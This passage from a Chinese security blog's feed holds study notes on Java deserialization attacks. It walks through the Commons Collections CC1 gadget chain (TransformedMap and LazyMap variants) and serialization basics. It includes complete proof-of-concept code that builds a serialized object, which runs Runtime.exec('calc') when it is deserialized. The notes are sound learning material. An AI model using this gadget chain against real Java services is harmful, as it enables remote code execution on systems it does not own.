class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="三、梳理整个CC1链"><a href="#三、梳理整个CC1链" class="headerlink" title="三、梳理整个CC1链"></a>三、梳理整个CC1链</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">AbstractInputCheckedMapDecorator.MapEntry.setValue()</span><br><span class="line">TransformedMap.checkSetValue()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;v&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">serialize(o);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="四、LazyMap版本"><a href="#四、LazyMap版本" class="headerlink" title="四、LazyMap版本"></a>四、LazyMap版本</h1><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC1%E9%93%BE.assets/image-20220805063930680.png" alt="image-20220805063930680"></p><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC1%E9%93%BE.assets/image-20220807142052146.png" alt="image-20220807142052146"></p><p>之前我们用的TransformedMap的checkSetValue方法，这次用LazyMap的get方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//LazyMap</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照这条链作者的思路，我们使用AnnotationInvocationHandler类中的invoke方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//AnnotationInvocationHandler</span></span><br><span class="line"><span class="comment">//构造方法中传递的memberValues</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">            paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">            <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那这样我们生成一个动态代理，传递AnnotationInvocationHandler，当该动态代理对象调用任意方法时（满足if条件）就可以触发invoke。【除equals、toString、hashCode、annotationType外，且一定是无参方法】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line">        </span><br><span class="line"><span class="comment">//因为AnnotationInvocationHandler构造方法接受map,我们需要调用它的readObject，所以要代理map接口</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">mapProxy.entrySet();</span><br></pre></td></tr></table></figure><p>可以调用成功，我们接下来要做的是找一个readObject,可以接受一个对象O，并且O调用一个无参方法</p><p>我们还看一下AnnotationInvocationHandler类,真是巧了</p><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC1%E9%93%BE.assets/image-20220807150502154.png" alt="image-20220807150502154"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">      <span class="built_in">this</span>.type = type;</span><br><span class="line">      <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>最终代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">//因为AnnotationInvocationHandler构造方法接受map,我们需要调用它的readObject，所以要代理map接口</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line">serialize(o);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p><strong>调用链</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br><span class="line">Requires:</span><br><span class="line">commons-collections</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> cc链 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC链学习笔记-前置知识</title>
      <link href="/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/"/>
      <url>/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>声明：本文为b站白日梦组长视频学习笔记，如有侵权，联系我速删</p><p>组长b站的传送门：<a href="https://space.bilibili.com/2142877265/?spm_id_from=333.999.0.0">https://space.bilibili.com/2142877265/?spm_id_from=333.999.0.0</a></p></blockquote><h1 id="一、java序列化和反序列化"><a href="#一、java序列化和反序列化" class="headerlink" title="一、java序列化和反序列化"></a>一、java序列化和反序列化</h1><p>java对象 –&gt; 字节</p><p>为了传输，类比快递，打包和拆包</p><p>有些快递打包拆包有独特的需求，比如易碎朝上，重写readObjec和writeObject</p><p><strong>为什么有安全问题？</strong></p><p>只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，基于攻击者在服务器上运行代码的能力。</p><p><strong>可能形式</strong></p><ol><li>入口类的readObject直接调用危险方法（基本没有这种情况）</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Person类</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream objectInputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        objectInputStream.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//反序列化后直接弹出计算器</span></span><br></pre></td></tr></table></figure><ol start="2"><li>入口类参数中包含可控类，该类有危险方法，readObject时调用</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">入口A HashMap 接受参数O</span><br><span class="line">目标类B URL</span><br><span class="line">目标调用B.f</span><br><span class="line">A.readObject.invoke -&gt; B.f</span><br></pre></td></tr></table></figure><ol start="3"><li>入口类参数中包含可控类，该类调用其他有危险方法的类，readObject时调用</li></ol><blockquote><p> 比如类型定义为Object,调用equals&#x2F;hashcode&#x2F;toString</p><p> 重点 相同类型 同名函数</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">B.f可以利用漏洞（执行命令）</span><br><span class="line">入口A接受一个Object</span><br><span class="line">最好情况： A[O] -&gt; O.f ,直接把B传过去，调用B.f</span><br><span class="line">现实情况： A[O] -&gt; O.abc,O调用别的方法</span><br><span class="line">但是如果O是一个动态代理，在他的invoke中调用了f,也可以利用漏洞</span><br><span class="line">O[O2] invoke -&gt; O2.f</span><br></pre></td></tr></table></figure><ol start="4"><li>构造函数&#x2F;静态代码块等类加载时隐式执行。</li></ol><p><strong>共同条件 实现Serializable，最好JDK自带</strong></p><p><strong>入口类</strong>  source (重写readObject  参数类型宽泛  最好jdk自带)<code>HashMap</code></p><p><strong>调用链</strong>  gadget chain</p><p><strong>执行类</strong>  sink  (rce ssrf 写文件等)</p><p><strong>反射在反序列化漏洞中的应用：</strong></p><p>定制需要的对象</p><p>通过invoke调用除了同名函数以外的函数</p><p>通过Class类创建对象，引入不能序列化的类</p><h2 id="小例子"><a href="#小例子" class="headerlink" title="小例子"></a>小例子</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化person对象，保存到文件中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;zhangsan&quot;</span>, <span class="number">22</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从文件中反序列化出person对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="keyword">return</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person)unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ObjectOutputStream代表对象输出流，writeObject对对象进行序列化，把得到的字节序列写到一个目标输出流中。</p><p>ObjectInputStream代表对象输入流，readObject从一个源输入流中读取字节序列，再把他们反序列化为一个对象，并将其返回。</p></blockquote><blockquote><p>并不是所有的类都是可以进⾏序<br>列化和反序列化的， 要进⾏序列化和反序列化则该类必须继承⾃<strong>java.io.Serializable</strong>接⼝（该类的全<br>部属性也必须继承⾃Serializable接⼝） 。 否则会抛出NotSerializableException报错  </p></blockquote><blockquote><p>反序列化是针对对象属性的，而不是针对类的，所以与类有关的静态成员变量是不会被反序列化的</p></blockquote><p>1.静态成员变量不参与序列化</p><p>2.transient标识的对象成员变量不参与序列化</p><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220801022119133.png" alt="image-20220801022119133" style="zoom:50%;"><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220801022135149.png" alt="image-20220801022135149" style="zoom:50%;"><h1 id="二、URLDNS链"><a href="#二、URLDNS链" class="headerlink" title="二、URLDNS链"></a>二、URLDNS链</h1><h2 id="1-HashMap"><a href="#1-HashMap" class="headerlink" title="1.HashMap"></a>1.HashMap</h2><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86.assets/image-20220801035208146.png" alt="image-20220801035208146"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HashMap重写了readObject方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line">        ......</span><br><span class="line">         <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">             <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                 <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">             <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                 <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">             putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>HashMap为什么要重写readObject方法?</p><p>HashMap中，Entry的存放位置是根据Key的Hash值来计算的。对于同一个key，在不同的JVM中计算得出的Hash可能不同。所以需要把每个对象提出来单独计算Hash并存储。</p></blockquote><p><img 